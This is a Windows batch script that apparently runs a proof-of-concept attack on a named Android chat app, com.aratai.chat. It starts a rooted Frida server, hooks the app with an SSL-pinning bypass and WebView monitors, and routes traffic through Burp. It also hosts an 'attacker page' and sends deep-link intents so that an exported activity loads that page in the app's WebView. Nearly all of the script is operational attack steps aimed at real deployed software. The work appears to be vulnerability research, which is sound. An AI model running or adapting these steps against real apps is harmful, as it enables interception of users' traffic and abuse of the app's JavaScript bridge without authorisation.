@echo off
REM ============================================================
REM Arattai WebView + SSL Bypass PoC Runner
REM ============================================================
REM
REM PREREQUISITES:
REM   1. Frida installed: pip install frida-tools
REM   2. Frida-server running on device (push to /data/local/tmp/)
REM   3. Burp Suite listening on port 8080
REM   4. Device proxy set to host_ip:8080
REM   5. Burp CA installed as system cert on device
REM
REM STEP-BY-STEP:
REM   Step 1: Push frida-server to emulator
REM   Step 2: Start frida-server
REM   Step 3: Run SSL bypass + WebView hooks
REM   Step 4: Trigger deep links
REM   Step 5: Host attacker page and load in WebView
REM ============================================================

set ADB=adb -s emulator-5554
set FRIDA_VER=16.7.19

echo.
echo ====== STEP 1: Check Frida server on device ======
%ADB% shell "ls /data/local/tmp/frida-server* 2>/dev/null"
if %ERRORLEVEL% neq 0 (
    echo [!] Frida server not found. Download from:
    echo     https://github.com/frida/frida/releases
    echo     Push: adb push frida-server-16.7.19-android-x86_64 /data/local/tmp/frida-server
    echo     Chmod: adb shell chmod 755 /data/local/tmp/frida-server
    pause
)

echo.
echo ====== STEP 2: Start frida-server ======
echo Starting frida-server in background...
%ADB% shell "su -c '/data/local/tmp/frida-server -D &'"
timeout /t 2

echo.
echo ====== STEP 3: Host PoC page ======
echo Starting Python HTTP server for attacker page...
echo Open a NEW terminal and run:
echo   cd D:\aratai\poc
echo   python -m http.server 8888
echo.
echo Then the PoC page will be at: http://YOUR_IP:8888/webview_exploit.html
echo.
pause

echo.
echo ====== STEP 4: Run Frida hooks (SSL bypass + WebView monitor) ======
echo Open a NEW terminal and run:
echo   frida -U -f com.aratai.chat -l D:\aratai\poc\frida_ssl_bypass.js -l D:\aratai\poc\frida_webview_hook.js --no-pause
echo.
echo Wait for the app to start, then press any key here to send deep links...
pause

echo.
echo ====== STEP 5: Send deep link payloads ======
echo.
echo --- Test A: ContactAction (exported, no permission) ---
%ADB% shell am start -n com.aratai.chat/com.zoho.chat.ContactAction -a android.intent.action.VIEW -d "https://web.arattai.in/"
timeout /t 3

echo --- Test B: Generic HTTPS URL to ExternalEntryPoint ---
%ADB% shell am start -W -a android.intent.action.VIEW -d "https://YOUR_IP:8888/webview_exploit.html" com.aratai.chat
timeout /t 3

echo --- Test C: Aratt.ai short URL ---
%ADB% shell am start -W -a android.intent.action.VIEW -d "https://aratt.ai/test" com.aratai.chat
timeout /t 3

echo.
echo ====== STEP 6: Check Frida output ======
echo Look for these markers in the Frida terminal:
echo   [!!!] ATTACKER URL LOADED IN WEBVIEW
echo   [!!!] DANGEROUS: File access enabled
echo   [!!!] intent:// URI being processed
echo   [BRIDGE-CALL] AndroidBridge.postAction()
echo   [DEEPLINK] ExternalEntryPointActivity.s0() called
echo.
echo ====== DONE ======
echo Check Burp Suite for intercepted traffic
echo Screenshots: adb shell screencap -p /sdcard/poc_result.png
pause
